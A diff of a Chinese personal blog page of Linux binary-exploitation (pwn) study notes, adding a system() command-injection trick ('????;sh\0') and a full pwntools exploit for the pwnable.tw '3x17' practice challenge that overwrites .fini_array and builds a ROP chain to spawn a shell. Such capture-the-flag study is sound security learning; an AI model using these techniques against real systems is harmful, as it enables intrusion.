@@ -127,7 +127,7 @@
 <meta property="og:site_name" content="w4rd3n的笔记">
 <meta property="og:description" content="劫持控制流 返回地址 最直接的劫持方法,需要栈溢出,越界读写,格式化字符串之类的漏洞,或者泄露栈地址的任意写. got表 got表未开保护的情况下可以覆写got表. vtable 各种函数表,典型有IO_FILE结构体的vtable和CPP中每个类的虚函数表. hook变量  当_malloc_hook不为NULL时会执行*_malloc_hook,调用malloc时触发. 当">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-07-03T05:40:11.562Z">
+<meta property="og:updated_time" content="2021-07-03T07:42:34.441Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-pwn-Linux-tips">
 <meta name="twitter:description" content="劫持控制流 返回地址 最直接的劫持方法,需要栈溢出,越界读写,格式化字符串之类的漏洞,或者泄露栈地址的任意写. got表 got表未开保护的情况下可以覆写got表. vtable 各种函数表,典型有IO_FILE结构体的vtable和CPP中每个类的虚函数表. hook变量  当_malloc_hook不为NULL时会执行*_malloc_hook,调用malloc时触发. 当">
@@ -503,7 +503,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">1.1k</span>
+                <span title="本文字数">2.1k</span>
               
 
               
@@ -517,7 +517,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">1 分钟</span>
+                <span title="阅读时长">2 分钟</span>
               
             </div>
           
@@ -558,8 +558,11 @@
 <h3 id="堆地址">堆地址</h3>
 <p>栈中残余参数,<code>bin</code>链表指针.</p>
 <h2 id="函数实现缺陷">函数实现缺陷</h2>
-<p><code>abs(0x80000000) == 0x80000000;</code>.</p>
-<p><code>scanf("%d", &amp;x);</code>,如果输入<code>+\n</code>会导致<code>scanf</code>正常执行但是不改变<code>x</code>.</p>
+<ul>
+<li><code>abs(0x80000000) == 0x80000000;</code>.</li>
+<li><code>scanf("%d", &amp;x);</code>,如果输入<code>+\n</code>会导致<code>scanf</code>正常执行但是不改变<code>x</code>.</li>
+<li><code>srand()</code>是根据种子生成伪随机数.</li>
+</ul>
 <h2 id="others">others</h2>
 <h3 id="小文件的多次映射">小文件的多次映射</h3>
 <p>当<code>ELF</code>文件比较小的时候,不同区段可能会被多次映射.例题:<code>jarvis smashes</code>.</p>
@@ -573,6 +576,13 @@
 <p><code>rdx</code>固定为<code>0</code>,<code>r12</code>来自下面的代码片段.</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;_dl_fini+<span class="number">777</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">r12</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="comment">;r12 = 0x600dd8</span></span><br><span class="line">&lt;_dl_fini+<span class="number">781</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="number">0x120</span>]</span><br><span class="line">&lt;_dl_fini+<span class="number">788</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">r12</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>]</span><br></pre></td></tr></table></figure>
 <p><code>rbx</code>的值为一个指针,该指针在<code>printf</code>执行的栈上存在,可以控制(<code>[rbx] = target_ptr - 0x600dd8</code>).</p>
+<h3 id="system">system</h3>
+<p><code>system("????;sh\0")</code>,利用了<code>system</code>截断参数的特性,也可以<code>&amp;&amp;sh\0</code>等.</p>
+<h3 id="fini_array">.fini_array</h3>
+<h4 id="pwnable-tw-3x17">pwnable-tw-3x17</h4>
+<p>动态调试发现<code>main</code>函数就是一个任意写,通过写<code>.fini_array</code>段的两个指针(先调用<code>array[1]</code>,再调用<code>array[0]</code>)控制程序流程写<code>ROP</code>链,通过<code>leave</code>修改<code>rsp</code>迁移栈.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="string">"10105"</span>)</span><br><span class="line"><span class="comment">#r = process('./3x17')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(addr, data)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'addr:'</span>)</span><br><span class="line">    r.sendline(str(addr))</span><br><span class="line">    r.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_func = <span class="number">0x401B6D</span></span><br><span class="line">loop_func = <span class="number">0x402960</span></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">pop_rdi = <span class="number">0x401696</span></span><br><span class="line">pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">syscall = <span class="number">0x471db5</span></span><br><span class="line">main_leave_ret = <span class="number">0x401C4B</span></span><br><span class="line"><span class="comment">#rsp = rbp = 0x4B40f8</span></span><br><span class="line">start = <span class="number">0x4B4100</span></span><br><span class="line"></span><br><span class="line">send_data(fini_array, p64(loop_func) + p64(main_func))</span><br><span class="line">send_data(start, p64(pop_rax) + p64(<span class="number">0x3b</span>))</span><br><span class="line">send_data(<span class="number">0x4BA9A0</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">send_data(start + <span class="number">0x10</span>, p64(pop_rdi) + p64(<span class="number">0x4BA9A0</span>))</span><br><span class="line">send_data(start + <span class="number">0x20</span>, p64(pop_rsi) + p64(<span class="number">0</span>))</span><br><span class="line">send_data(start + <span class="number">0x30</span>, p64(pop_rdx) + p64(<span class="number">0</span>))</span><br><span class="line">send_data(start + <span class="number">0x40</span>, p64(syscall))</span><br><span class="line">send_data(fini_array, p64(main_leave_ret))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="section"></h3>
 
       
     </div>
@@ -619,8 +629,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/posts/7d044205/" rel="prev" title="writeup-强网杯-2019-babycpp">
-                writeup-强网杯-2019-babycpp <i class="fa fa-chevron-right"></i>
+              <a href="/posts/a4257a9b/" rel="prev" title="IS-reverse-Android-基础">
+                IS-reverse-Android-基础 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -695,7 +705,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">155</span>
+                    <span class="site-state-item-count">121</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -825,7 +835,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">36</span>
+                      
+                    
+                    <span class="site-state-item-count">37</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -875,7 +887,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#劫持控制流"><span class="nav-number">1.</span> <span class="nav-text">劫持控制流</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#返回地址"><span class="nav-number">1.1.</span> <span class="nav-text">返回地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#got表"><span class="nav-number">1.2.</span> <span class="nav-text">got表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vtable"><span class="nav-number">1.3.</span> <span class="nav-text">vtable</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hook变量"><span class="nav-number">1.4.</span> <span class="nav-text">hook变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#泄露地址"><span class="nav-number">2.</span> <span class="nav-text">泄露地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#libc"><span class="nav-number">2.1.</span> <span class="nav-text">libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack"><span class="nav-number">2.2.</span> <span class="nav-text">stack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#堆地址"><span class="nav-number">2.3.</span> <span class="nav-text">堆地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#函数实现缺陷"><span class="nav-number">3.</span> <span class="nav-text">函数实现缺陷</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#others"><span class="nav-number">4.</span> <span class="nav-text">others</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小文件的多次映射"><span class="nav-number">4.1.</span> <span class="nav-text">小文件的多次映射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#syscall"><span class="nav-number">4.2.</span> <span class="nav-text">syscall</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#read"><span class="nav-number">4.3.</span> <span class="nav-text">read</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exit"><span class="nav-number">4.4.</span> <span class="nav-text">exit</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#劫持控制流"><span class="nav-number">1.</span> <span class="nav-text">劫持控制流</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#返回地址"><span class="nav-number">1.1.</span> <span class="nav-text">返回地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#got表"><span class="nav-number">1.2.</span> <span class="nav-text">got表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vtable"><span class="nav-number">1.3.</span> <span class="nav-text">vtable</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hook变量"><span class="nav-number">1.4.</span> <span class="nav-text">hook变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#泄露地址"><span class="nav-number">2.</span> <span class="nav-text">泄露地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#libc"><span class="nav-number">2.1.</span> <span class="nav-text">libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack"><span class="nav-number">2.2.</span> <span class="nav-text">stack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#堆地址"><span class="nav-number">2.3.</span> <span class="nav-text">堆地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#函数实现缺陷"><span class="nav-number">3.</span> <span class="nav-text">函数实现缺陷</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#others"><span class="nav-number">4.</span> <span class="nav-text">others</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小文件的多次映射"><span class="nav-number">4.1.</span> <span class="nav-text">小文件的多次映射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#syscall"><span class="nav-number">4.2.</span> <span class="nav-text">syscall</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#read"><span class="nav-number">4.3.</span> <span class="nav-text">read</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exit"><span class="nav-number">4.4.</span> <span class="nav-text">exit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#system"><span class="nav-number">4.5.</span> <span class="nav-text">system</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fini_array"><span class="nav-number">4.6.</span> <span class="nav-text">.fini_array</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pwnable-tw-3x17"><span class="nav-number">4.6.1.</span> <span class="nav-text">pwnable-tw-3x17</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section"><span class="nav-number">4.7.</span> <span class="nav-text"></span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -907,7 +919,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">898k</span>
+    <span title="站点总字数">807k</span>
   
 
   
@@ -916,7 +928,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">13:36</span>
+    <span title="站点阅读时长">12:13</span>
   
 </div>
 
